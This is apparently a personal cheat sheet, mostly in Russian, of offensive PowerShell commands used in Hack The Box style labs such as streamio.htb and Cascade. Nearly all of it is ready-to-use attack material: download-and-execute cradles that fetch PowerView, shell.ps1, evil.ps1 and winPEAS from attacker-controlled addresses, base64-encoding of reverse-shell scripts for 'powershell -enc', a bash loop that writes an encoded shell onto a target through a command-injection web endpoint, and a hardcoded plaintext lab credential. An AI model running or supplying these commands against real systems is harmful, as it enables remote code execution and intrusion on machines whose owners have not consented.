# POWER

https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainGroupMember/

Запустить повер виев

. .\PowerView.ps1

загрузиь повервью в память

IEX(New-Object Net.WebClient).downloadString('http://10.10.14.15/PowerView.ps1')

"powershell "IEX(New-Object Net.WebClient).downloadString(''http://10.10.14.9/shell.ps1'')""   ---Бывает и так!!!!!

Поскольку у нас нет оболочки для JDgodd, мы можем использовать PowerShell.
 System.Management.Automation.PSCredential для хранения учетных данных в нашей текущей оболочке.

 $SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd',
$SecPassword)

# Кодирование скриптов POwerShell
--Кодирование в base64

  $Shell=Get-Content -raw ./Invoke-PowerShellIcmp.ps1
  
  $bytes2 = [System.Text.Encoding]::Unicode.GetBytes($Shell)

  $Encoded2 | out-file icmp.ps1.b64

--Декодирование обратно

  $Decode =[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($Encoded2))
  
# Загрузка скрипат построчно

!/bin/bash
export IFS=$'\n'
for line in $(cat tmp.ps1.b64);
do
max="echo ${line} >> C:\Temp\max_shell.ps1"
curl -v -G -X GET 'http://10.10.10.57:62696/test.asp?u=http://127.0.0.1/cmd.aspx' --data-urlencode "xcmd=$max"
done


-------------------------------------
cat rev.ps1 |iconv -t UTF-16LE | base64 -w 0 (вывод)

powershell -enc (вывод)

# Восстаовление корзины

Get-ADObject -SearchBase "CN=Deleted Objects,DC=Cascade,DC=Local" -Filter {ObjectClass -eq "user"} -IncludeDeletedObjects -Properties *

# Загрузка скрипта и выполнение

IEX(New-Object Net.WebClient).downloadString('http://10.10.14.4/evil.ps1')

echo IEX(New-Object Net.WebClient).downloadString('http://10.10.14.6:8000/winPEAS.ps1') | powershell -noprofile 

iwr -uri http://10.10.14.9/test -outfile test

IEX(IWR('10.10.10.10/script.ps1'))

# Доступ к ресурсу SMB

Get-Content //10.10.14.4/file
